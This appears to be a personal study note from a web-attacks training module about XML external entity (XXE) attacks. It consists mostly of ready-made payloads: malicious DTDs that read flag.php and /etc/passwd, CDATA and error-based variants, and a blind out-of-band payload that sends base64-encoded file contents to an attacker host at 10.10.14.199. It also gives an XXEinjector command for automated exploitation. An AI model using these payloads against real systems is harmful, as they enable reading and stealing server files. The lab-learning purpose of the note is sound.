# web_attacks

Created: March 31, 2025 11:52 PM
Tags: xxe

ALWAYS APPEND `-n` / `-w 0` WHEN DOING CRYPTO OPERATIONS USING BASH!

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image.png)

XXE Filter mitigation: Use PUBLIC instead of SYSTEM

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%201.png)

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%202.png)

XXE: how to read non-php files without filters including special characters? Use CDATA paired with external DTD

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%203.png)

Code challenge:

Self hosted malicious DTD:

```bash
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```

Payload:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % dtd SYSTEM
  "http://10.10.14.199:8000/xxe.dtd">
  %dtd;
  %all;
]>
<root>
<name>johnn</name>
<tel>+231254545</tel>
<email>&fileContents;</email>
<message>a?</message>
</root>
```

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%204.png)

Error-based XXE:

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%205.png)

Self-hosted malicious DTD:

```bash
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Payload:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.199:8000/xxerror.dtd">
  %remote;
  %error;
]>
<root>
<name>johnn</name>
<tel>+231254545</tel>
<email></email>
<message>a?</message>
</root>
```

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%206.png)

Blind XXE:

When the data is not displayed in any way on a screen itself.

Self-hosted malicious XXE:

```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.199:8000/?content=%file;'>">
%oob;
```

Payload:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.199:8000/xxeoob.dtd">
  %remote;
]>
<root>&content;</root>
```

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%207.png)

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%208.png)

Autoexploit for Blind XXE:

```bash
ruby XXEinjector.rb --host=10.10.14.199 --httpport=8000 --file=req --path=/etc/passwd --oob=http --phpfilter
```

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%209.png)

![image.png](web_attacks%201c7021737a89800c98eedbcd483bd5d5/image%2010.png)

---

[Web_Attacks_Module_Cheat_Sheet.pdf](web_attacks%201c7021737a89800c98eedbcd483bd5d5/Web_Attacks_Module_Cheat_Sheet.pdf)